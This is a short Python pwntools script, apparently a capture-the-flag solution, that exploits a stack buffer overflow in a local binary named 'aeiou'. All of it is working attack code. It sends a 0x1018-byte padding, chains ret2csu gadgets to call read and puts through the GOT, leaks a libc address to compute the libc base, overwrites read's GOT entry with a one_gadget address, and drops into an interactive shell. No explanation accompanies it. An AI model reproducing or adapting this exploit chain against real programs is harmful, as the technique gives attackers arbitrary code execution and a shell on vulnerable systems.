from pwn import *

p = process("./aeiou",env={"LD_PRELOAD":"libc.so"})
binary = ELF("./aeiou")
l = ELF("./libc.so",checksec=False)

p.sendlineafter(">>","3")

csu_init = 0x4026ea
trigger = 0x4026d0

payload = "A"*0x1018

payload += p64(csu_init)
payload += p64(0) #x
payload += p64(1) #p
payload += p64(binary.got["read"]) #12
payload += p64(0x100) #13
payload += p64(binary.bss() + 0x100) #14
payload += p64(0) #15
payload += p64(trigger)
payload += p64(0x4141) # dummy

payload += p64(0)
payload += p64(1)
payload += p64(binary.got["puts"])
payload += p64(0) * 2
payload += p64(binary.got["read"])
payload += p64(trigger)
payload += p64(0x4141)

payload += p64(0)
payload += p64(1)
payload += p64(binary.got["read"])
payload += p64(0x100)
payload += p64(binary.bss() + 0x110)
payload += p64(0)
payload += p64(trigger)
payload += p64(0x4141)

payload += p64(0)
payload += p64(1)
payload += p64(binary.bss() + 0x110)
payload += p64(0)
payload += p64(0)
payload += p64(binary.bss() + 0x100)
payload += p64(trigger)
payload += p64(0x4141)

payload += p64(0) * 6
payload += p64(0x400E9A)

payload = payload.ljust(0x2000, "A")

p.sendlineafter("number!",str(0x2000))

p.send(payload)
p.send('/bin/sh\00')

p.recvuntil("You :)\n")

libc_base = u64(p.recv(8)[:-1].ljust(8, "\x00")) - l.symbols["read"]
log.info("Address of libc_base : "+str(hex(libc_base)))

system = libc_base + l.symbols['system']
one_shot = libc_base + 0x4526a

p.send(p64(one_shot))
p.interactive()
